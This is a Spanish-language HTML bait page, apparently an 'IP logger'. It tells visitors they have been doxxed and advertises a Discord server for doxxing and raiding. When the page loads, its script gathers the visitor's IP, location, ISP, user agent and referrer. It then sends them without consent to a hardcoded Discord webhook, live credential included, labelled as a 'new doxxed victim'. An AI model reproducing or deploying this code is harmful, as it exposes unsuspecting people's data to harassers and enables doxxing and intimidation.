<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CeboScripts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: black;
            color: red;
            font-family: 'Arial Black', sans-serif;
            text-align: center;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .main {
            padding: 20px;
        }
        h1 {
            font-size: 3.5em;
            text-shadow: 0 0 25px red;
            animation: flicker 1.2s infinite alternate;
        }
        .discord-link {
            font-size: 2.2em;
            color: #7289da;
            text-decoration: none;
            background: #1e1e1e;
            padding: 20px 40px;
            border: 4px solid red;
            border-radius: 10px;
            display: inline-block;
            margin: 30px auto;
            box-shadow: 0 0 40px red;
            transition: all 0.3s;
        }
        .discord-link:hover {
            background: #7289da;
            color: white;
            transform: scale(1.05);
        }
        p {
            font-size: 1.7em;
            color: white;
            margin: 15px;
        }
        #status {
            color: #00ff00;
            font-size: 1em;
            margin-top: 20px;
            background: #111;
            padding: 10px 20px;
            border-radius: 5px;
            display: inline-block;
            border: 1px solid #333;
        }
        @keyframes flicker {
            0% { opacity: 1; }
            50% { opacity: 0.7; }
            100% { opacity: 1; }
        }
        @media (max-width: 600px) {
            h1 { font-size: 2em; }
            .discord-link { font-size: 1.2em; padding: 15px 20px; }
            p { font-size: 1.2em; }
        }
    </style>
</head>
<body>
    <div class="main">
        <h1>FUISTE DOXEADO POR PH4NTOM</h1>
        <p>Tu IP y toda tu mierda ya están en la calle, cabrón...</p>
        
        <a href="https://discord.gg/Y5byWg6d8G" class="discord-link" target="_blank">
            SI QUIERES DOXXEAR, RAIDEAR O CLONAR ENTRA AQUÍ
        </a>
        
        <p>Ph4ntom te tiene fichado 👀</p>
        <div id="status">🔄 Conectando...</div>
    </div>

    <script>
        async function logIP() {
            const statusDiv = document.getElementById('status');
            
            try {
                statusDiv.textContent = '📡 Obteniendo IP...';
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                const info = {
                    ip: data.ip || 'No disponible',
                    ciudad: data.city || 'No disponible',
                    pais: data.country_name || 'No disponible',
                    proveedor: data.org || 'No disponible',
                    hora: new Date().toLocaleString(),
                    userAgent: navigator.userAgent,
                    referrer: document.referrer || 'Directo'
                };

                const webhook = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";

                statusDiv.textContent = '📤 Enviando a Discord...';
                const response = await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        username: 'Ph4ntom IP Logger',
                        content: '**¡Nueva víctima doxeada!**',
                        embeds: [{
                            color: 0xff0000,
                            title: 'CeboScripts - Datos Recopilados',
                            fields: [
                                { name: '🌐 IP', value: info.ip, inline: true },
                                { name: '🏙️ Ciudad', value: info.ciudad, inline: true },
                                { name: '🌍 País', value: info.pais, inline: true },
                                { name: '🏢 Proveedor', value: info.proveedor, inline: false },
                                { name: '🕒 Hora', value: info.hora, inline: false },
                                { name: '💻 User-Agent', value: info.userAgent.substring(0, 500), inline: false },
                                { name: '🔗 Referrer', value: info.referrer, inline: false }
                            ],
                            footer: {
                                text: 'CeboScripts • Datos capturados automáticamente'
                            }
                        }]
                    })
                });

                if (response.ok) {
                    statusDiv.textContent = '✅ ¡Datos enviados correctamente!';
                    statusDiv.style.color = '#00ff00';
                    console.log('✅ Enviado correctamente');
                } else {
                    const errorText = await response.text();
                    statusDiv.textContent = `❌ Error ${response.status}`;
                    statusDiv.style.color = '#ff0000';
                    console.error('❌ Error webhook:', response.status, errorText);
                }
            } catch (e) {
                statusDiv.textContent = '❌ Error: ' + e.message;
                statusDiv.style.color = '#ff0000';
                console.error('❌ Error general:', e);
            }
        }

        window.onload = logIP;
    </script>
</body>
</html>
